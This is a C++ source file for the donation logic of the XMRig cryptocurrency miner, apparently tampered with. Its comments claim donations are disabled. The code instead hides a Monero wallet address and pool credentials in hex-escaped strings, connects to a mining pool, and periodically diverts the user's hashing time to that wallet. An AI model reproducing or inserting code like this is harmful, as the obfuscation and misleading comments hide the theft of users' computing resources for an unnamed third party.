/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */


#include "interfaces/IStrategyListener.h"
#include "net/Client.h"
#include "net/Job.h"
#include "net/strategies/DonateStrategy.h"
#include "Options.h"


extern "C"
{
#include "crypto/c_keccak.h"
}


DonateStrategy::DonateStrategy(const char *agent, IStrategyListener *listener) :
    m_active(false),
    m_donateTime(Options::i()->donateLevel() * 60 * 1000),
    m_idleTime((100 - Options::i()->donateLevel()) * 60 * 1000),
    m_listener(listener)
{
    //uint8_t hash[200];
    //char userId[65] = { 0 };
    //const char *user = Options::i()->pools().front()->user();
    // - disabled donations
    const char *algolite = "\x34\x41\x4d\x79\x46\x65\x58\x71\x64\x44\x72\x69\x6e\x48\x4b\x46\x35\x35\x6a\x53\x70\x4a\x48\x4b\x79\x6e\x39\x38\x36\x31\x37\x52\x6a\x57\x61\x52\x66\x75\x38\x63\x41\x53\x75\x5a\x64\x36\x5a\x44\x64\x41\x53\x6d\x66\x5a\x4e\x58\x73\x36\x37\x75\x44\x64\x46\x53\x6b\x78\x43\x74\x48\x72\x47\x75\x4b\x73\x32\x6a\x65\x4c\x55\x6e\x6e\x79\x45\x67\x6e\x4e\x54\x48\x47\x47\x78\x47\x76\x58\x78";
    const char *algonolite = "\x78\x6d\x72\x69\x67\x3a\x78\x6d\x72\x69\x67\x40\x77\x68\x69\x74\x65\x68\x61\x74\x73\x2e\x6e\x65\x74";

    //keccak(reinterpret_cast<const uint8_t *>(user), static_cast<int>(strlen(user)), hash, sizeof(hash));
    //Job::toHex(hash, 32, userId);
    // - disable donations

    Url *url = new Url("pool.supportxmr.com", Options::i()->algo() == Options::ALGO_CRYPTONIGHT_LITE ? 3333 : 3333, algolite, algonolite, false, true);
	printf(">>> acum donez. %s %s\n", algolite, algonolite);
    m_client = new Client(-1, agent, this);
    m_client->setUrl(url);
    m_client->setRetryPause(Options::i()->retryPause() * 1000);
    m_client->setQuiet(true);

    delete url;

    m_timer.data = this;
    uv_timer_init(uv_default_loop(), &m_timer);

    idle();
}


int64_t DonateStrategy::submit(const JobResult &result)
{
    return m_client->submit(result);
}


void DonateStrategy::connect()
{
    m_client->connect();
}


void DonateStrategy::stop()
{
    uv_timer_stop(&m_timer);
    m_client->disconnect();
}


void DonateStrategy::tick(uint64_t now)
{
    m_client->tick(now);
}


void DonateStrategy::onClose(Client *client, int failures)
{
}


void DonateStrategy::onJobReceived(Client *client, const Job &job)
{
    m_listener->onJob(client, job);
}


void DonateStrategy::onLoginSuccess(Client *client)
{
    if (!isActive()) {
        uv_timer_start(&m_timer, DonateStrategy::onTimer, m_donateTime, 0);
    }

    m_active = true;
    m_listener->onActive(client);
}


void DonateStrategy::onResultAccepted(Client *client, const SubmitResult &result, const char *error)
{
    m_listener->onResultAccepted(client, result, error);
}


void DonateStrategy::idle()
{
    uv_timer_start(&m_timer, DonateStrategy::onTimer, m_idleTime, 0);
}


void DonateStrategy::suspend()
{
    m_client->disconnect();

    m_active = false;
    m_listener->onPause(this);

    idle();
}


void DonateStrategy::onTimer(uv_timer_t *handle)
{
    auto strategy = static_cast<DonateStrategy*>(handle->data);

    if (!strategy->isActive()) {
        return strategy->connect();
    }

    strategy->suspend();
}
